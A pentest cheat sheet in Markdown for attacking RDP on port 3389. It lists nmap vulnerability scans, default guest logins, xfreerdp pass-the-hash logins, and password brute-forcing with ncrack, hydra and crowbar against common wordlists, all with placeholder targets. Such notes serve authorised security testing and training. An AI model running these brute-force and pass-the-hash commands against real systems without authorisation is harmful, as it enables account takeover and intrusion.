# 3389 (RDP)

## Enumeration

### Checks

* [ ] Check if you can login with default guest account and blank password
* [ ] Check if you can brute force users
* [ ] Check for BlueKeep

### nmap

```bash
nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 <IP> -o 3389_nmap_rdp
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```

### Check known credentials

```bash
rdp_check <domain>/<name>:<password>@<IP>  # rdp_check.py from impacket
```

### Manual Login

#### rdesktop

```bash
rdesktop <IP>
# Try default guest account "guest":""
rdesktop -u guest <IP> -g 94%
rdesktop -u guest -p guest <IP> -g 94%
# Use known credentials
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
```

#### xfreerdp

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:[IP] /u:bitbucket /p:[PW]

xfreerdp /u:username /p:password /cert:ignore /v:MACHINE_IP
xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>

xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>

xfreerdp /u:[domain\]<username> /p:<password> /v:<IP>
xfreerdp /u:[domain\]<username> /pth:<hash> /v:<IP>
```

## Brute Force

#### ncrack

```bash
ncrack -vv --user Administrator -P /usr/share/wordlists/rockyou.txt rdp://<IP>
ncrack -vv --user Administrator -P /usr/share/seclists/Passwords/darkweb2017-top100.txt rdp://<IP>

```

#### Hydra

```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt -t 5 -V ip_address rdp
hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
```

#### crowbar

```bash
crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>
```
